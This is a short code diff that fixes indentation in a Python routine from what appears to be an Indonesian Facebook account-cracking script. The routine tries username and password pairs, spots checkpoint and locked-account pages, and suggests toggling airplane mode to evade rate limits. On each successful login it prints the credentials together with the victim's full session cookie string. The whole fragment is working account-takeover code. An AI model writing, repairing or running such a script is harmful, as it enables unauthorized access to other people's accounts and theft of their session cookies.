@@ -523,11 +523,11 @@ def log_hasil(user, pasw):
     response=par(urlPost.text, "html.parser")
     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
     if "c_user" in session.cookies.get_dict():
-    if "Akun Anda Dikunci" in urlPost.text:
-    if self.satua==True:
-      print(f"{P}[CP] {self.user} | {self.pw}",end="")
-      print(f"\r[×] Akun sesi new\n\n",end="")
-    else:
+      if "Akun Anda Dikunci" in urlPost.text:
+        if self.satua==True:
+          print(f"{P}[CP] {self.user} | {self.pw}",end="")
+          print(f"\r[×] Akun sesi new\n\n",end="")
+      else:
         aman+=1
         coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
     if self.satua==True:print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
